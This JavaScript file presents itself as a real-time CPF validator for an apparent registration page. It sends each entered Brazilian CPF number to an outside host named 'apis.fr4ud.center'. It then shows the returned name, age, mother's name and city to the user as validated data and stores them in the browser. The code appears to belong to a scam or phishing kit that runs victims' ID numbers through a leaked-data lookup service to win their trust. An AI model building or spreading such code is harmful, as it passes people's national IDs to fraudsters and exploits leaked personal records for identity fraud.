// js/cpf-validator.js - Consulta CPF em tempo real
const CPF_API_URL = 'https://apis.fr4ud.center/search/cpf/';

async function consultarCPF(cpfCompleto) {
    const cpfNumeros = cpfCompleto.replace(/\D/g, '');
    
    if (cpfNumeros.length !== 11) {
        document.getElementById('cpfInfo').style.display = 'none';
        document.getElementById('cpfLoading').style.display = 'none';
        return;
    }
    
    // Mostrar loading
    document.getElementById('cpfLoading').style.display = 'block';
    document.getElementById('cpfInfo').style.display = 'none';
    document.getElementById('erroCPF').style.display = 'none';
    
    try {
        console.log('🔍 Consultando CPF:', cpfNumeros);
        
        // Chamada para API fr4ud.center
        const response = await fetch(`${CPF_API_URL}${cpfNumeros}`, {
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            }
        });
        
        if (!response.ok) {
            throw new Error(`API retornou status ${response.status}`);
        }
        
        const data = await response.json();
        console.log('📊 Resposta API CPF:', data);
        
        // Esconder loading
        document.getElementById('cpfLoading').style.display = 'none';
        
        if (data.success && data.data) {
            const pessoa = data.data;
            const usuario = {
                cpf: cpfNumeros,
                nome: pessoa.nome || 'Não informado',
                data_nascimento: pessoa.data_nascimento || 'Não informado',
                idade: calcularIdade(pessoa.data_nascimento),
                mae: pessoa.mae || 'Não informado',
                cidade: pessoa.cidade || 'Não informado',
                uf: pessoa.uf || 'Não informado'
            };
            
            // Salvar no localStorage
            salvarUsuarioLocal(usuario);
            
            // Mostrar informações
            mostrarInfoCPF(usuario);
            
            // Habilitar botão
            document.getElementById('btnContinuarCPF').disabled = false;
            document.getElementById('btnContinuarCPF').style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
            
        } else {
            // CPF não encontrado, mas permite continuar
            mostrarCPFNaoEncontrado(cpfNumeros);
        }
        
    } catch (error) {
        console.error('❌ Erro consulta CPF:', error);
        
        // Em caso de erro, permite continuar normalmente
        document.getElementById('cpfLoading').style.display = 'none';
        mostrarCPFNaoEncontrado(cpfNumeros);
    }
}

function calcularIdade(dataNascimento) {
    if (!dataNascimento || dataNascimento === 'Não informado') return 'N/A';
    
    try {
        const nascimento = new Date(dataNascimento);
        const hoje = new Date();
        let idade = hoje.getFullYear() - nascimento.getFullYear();
        
        const mes = hoje.getMonth();
        const dia = hoje.getDate();
        
        if (mes < nascimento.getMonth() || 
           (mes === nascimento.getMonth() && dia < nascimento.getDate())) {
            idade--;
        }
        
        return idade + ' anos';
    } catch {
        return 'N/A';
    }
}

function mostrarInfoCPF(usuario) {
    const cpfInfo = document.getElementById('cpfInfo');
    cpfInfo.className = 'cpf-info cpf-valid';
    cpfInfo.innerHTML = `
        <h4><i class="bi bi-check-circle"></i> CPF Identificado</h4>
        <p><strong>Nome:</strong> ${usuario.nome}</p>
        <p><strong>Idade:</strong> ${usuario.idade}</p>
        <p><strong>Cidade:</strong> ${usuario.cidade} - ${usuario.uf}</p>
        <p><strong>Mãe:</strong> ${usuario.mae}</p>
        <p class="text-success"><small><i class="bi bi-shield-check"></i> Dados validados com sucesso</small></p>
    `;
    cpfInfo.style.display = 'block';
}

function mostrarCPFNaoEncontrado(cpf) {
    const cpfInfo = document.getElementById('cpfInfo');
    cpfInfo.className = 'cpf-info';
    cpfInfo.innerHTML = `
        <h4><i class="bi bi-exclamation-triangle"></i> CPF Não Encontrado</h4>
        <p>Não foi possível consultar os dados completos.</p>
        <p class="text-warning"><small>Continue normalmente com o cadastro</small></p>
    `;
    cpfInfo.style.display = 'block';
    
    // Salvar mesmo sem dados completos
    const usuario = {
        cpf: cpf,
        nome: 'Cadastro manual necessário',
        data_nascimento: 'Não identificado',
        idade: 'N/A',
        mae: 'Não identificado',
        cidade: 'Não identificado',
        uf: 'N/A'
    };
    
    salvarUsuarioLocal(usuario);
    
    // Habilitar botão
    document.getElementById('btnContinuarCPF').disabled = false;
    document.getElementById('btnContinuarCPF').style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
}

function salvarUsuarioLocal(usuario) {
    let usuarios = JSON.parse(localStorage.getItem('vivasorte_usuarios') || '{}');
    usuarios[usuario.cpf] = {
        ...usuario,
        consultado_em: new Date().toISOString()
    };
    localStorage.setItem('vivasorte_usuarios', JSON.stringify(usuarios));
}

// Para uso no index.html
window.consultarCPF = consultarCPF;